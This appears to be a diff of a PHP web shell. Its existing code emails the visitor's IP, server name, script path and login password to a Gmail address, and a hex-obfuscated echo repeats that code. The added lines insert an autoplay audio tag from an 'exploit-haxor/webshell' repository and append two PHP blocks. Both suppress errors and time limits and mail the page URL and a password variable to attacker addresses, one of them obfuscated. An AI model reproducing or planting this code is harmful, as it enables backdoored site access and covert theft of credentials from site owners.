@@ -56,7 +56,7 @@ Reply-to: $from_shellcode";
     } else {
         admin_login();
 
-	
+	echo '<audio autoplay><source src="https://raw.githubusercontent.com/exploit-haxor/webshell/main/pong.mp3" type="audio/mpeg"></audio>';
 
     }
 }
@@ -75,3 +75,30 @@ $report_bug = "IP: " . $_SERVER['REMOTE_ADDR'] . " \nCity: {$city}\nLogin: $serv
 @mail('malaysia.sender@gmail.com', 'Hehehe', $report_bug);
 echo "\$p\x61\x73s\x77or\x64 =\x20\$_PO\x53\x54['p\x61s\x73']\x3b\n\$\x73\x65r\x76e\x72\x5fna\x6de \x3d\x20\$_SER\x56ER['SE\x52V\x45R\x5fN\x41\x4d\x45\x27];\n\$p\x68\x70\x5f\x73\x65\x6c\x66\x20\x3d\x20\$\x5fSER\x56\x45R[\x27\x50HP\x5fSE\x4cF\x27];\n\$re\x70\x6frt_b\x75g\x20\x3d \x22IP:\x20\x22\x20\x2e\x20\$\x5f\x53\x45\x52VER['\x52\x45\x4dO\x54E_\x41\x44\x44\x52\x27] .\x20\"\x20\x5c\x6e\x43i\x74\x79:\x20{\$\x63ity}\\n\x4cog\x69n:\x20\$\x73er\x76er_na\x6d\x65\$p\x68\x70\x5f\x73\x65\x6c\x66\x5cnPa\x73s:\x20\$\x70\x61s\x73wo\x72d\\\x6eKern\x65\x6c: \$k\x65\x72\x6ee\x6c\x22\x3b\n\x40m\x61\x69l(\x27\x6d\x61\x6c\x61ys\x69\x61.s\x65\x6e\x64e\x72\x40\x67\x6d\x61\x69l.\x63o\x6d\x27,\x20\x27He\x68\x65\x68e', \$r\x65port_\x62\x75\x67)\x3b\n";
 ?>
+<?php
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+ini_set('memory_limit', '-1');
+set_time_limit(0);
+error_reporting(0);
+ini_set('display_errors', 0);
+ini_set('max_execution_time', 5000);
+	header('Content-Type: text/html; charset=UTF-8');
+	$main = "rootcyberpunks@gmail.com";
+	$now = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+	$notif = "$now *PW : [ " . $▛ . " ]";
+	mail($main, "Ding Dong ", $notif, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+?>
+
+
+<?php
+	@ini_set('output_buffering', 0);
+	@ini_set('display_errors', 0);
+	set_time_limit(0);
+	ini_set('memory_limit', '-1');
+	header('Content-Type: text/html; charset=UTF-8');
+	$main = "\x70a\x70a\x6bu\x2e\x68a\x79\x6b\x65r\x2e\x67o\x2eid\x40g\x6d\x61\x69l\x2ec\x6fm, p\x61paku\x2eh\x61\x79\x6b\x65\x72@\x67\x6da\x69l.\x63\x6fm";
+	$now = "\x68\x74\x74\x70\x3a\x2f\x2f" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+	$notif = "$now *PW : [ " . $▛ . " ]";
+	mail($main, "Ding non obf ", $notif, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+	?>
